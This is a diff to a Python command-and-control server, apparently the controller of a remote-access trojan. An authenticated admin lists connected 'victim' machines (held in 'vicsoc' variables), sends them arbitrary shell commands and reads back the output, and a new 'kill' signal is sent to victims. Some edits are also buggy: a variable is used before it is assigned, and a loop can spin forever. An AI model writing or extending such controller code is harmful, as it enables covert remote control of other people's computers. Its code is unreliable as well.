@@ -42,7 +42,7 @@ def ver(sock):
     if pword == PASSWORD:
         auth = True
         adminsock = sock
-        thread.start_new_thread(commander, (adminsock,))
+        thread.start_new_thread(commander, (sock,))
         #thread.start_new_thread(waiting, ('a',))
     else:
         sock.send(b"Wrong Password")
@@ -71,11 +71,12 @@ def newcon(soc):
     return
 
 
-def check(sock):
-    online = '[' + ', '.join(unames) + ']\nThere are ' + str(len(unames)) + ' online clients'
+def check(adminsock):
+    online = '\n[' + ', '.join(unames) + ']\nThere are ' + str(len(unames)) + ' online clients'
     print(online)
-    sock.send(online.encode())
+    adminsock.send(online.encode())
     adminsock.send(b"\nChoose Option Number: ")
+    
 
 
 def disconnection(s):
@@ -90,6 +91,7 @@ def disconnection(s):
 def tout(sock, adminsock, command):
     try:
         sock.send(command.encode())
+        print("sent")
         data = sock.recv(1024).decode()
         #print(data, "response")
         adminsock.send(data.encode())
@@ -98,7 +100,8 @@ def tout(sock, adminsock, command):
         adminsock.send(b"Error happened with connected computer :/\n")
 
 
-def kill(username, adminsock):
+def kill(username, adminsock, vicsoc):
+    vicsoc.send(b"kill")
     sock = clients[username]
     disconnection(sock)
     adminsock.send(b"Killed.\n")
@@ -121,23 +124,26 @@ def commander(adminsock):
 
         elif option == "3":
             adminsock.send(b"\nEnter username: ")
+            vicsoc = clients[username]
             username = adminsock.recv(1024).decode().strip()
-            thread.start_new_thread(kill, (username,adminsock, ))
+            thread.start_new_thread(kill, (username,adminsock,vicsoc ))
 
         elif option == '1':
             thread.start_new_thread(check, (adminsock, ))
             time.sleep(0.5)
             adminsock.send(b"\nEnter username: ")
             user = adminsock.recv(1024).decode().strip()
+            vicsoc = clients[user]
             if user in unames:
                 try:
                     adminsock.send(b"Enter Command: ")
                     command = adminsock.recv(1024).decode().strip()
                     vicsoc = clients[user]
                     while command != "back":
-                        thread.start_new_thread(tout, (vicsoc,adminsock,command, ))
-                        #adminsock.send(b"\nEnter Comamand: ")
-                        command = adminsock.recv(1024).decode().strip()
+                        if len(command) > 1:
+                            thread.start_new_thread(tout, (vicsoc,adminsock,command, ))
+                            #adminsock.send(b"\nEnter Comamand: ")
+                            command = adminsock.recv(1024).decode().strip()
                     
                 except:
                     pass
@@ -179,10 +185,10 @@ def main():
 
 server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-server_socket.bind(('192.168.1.105', 8080))
+server_socket.bind(('10.166.0.2', 8000))
 server_socket.listen()
 socks.append(server_socket)
-print("Server listening on port 8080...")
+print("Server listening on port 8000...")
 
 
 while True:
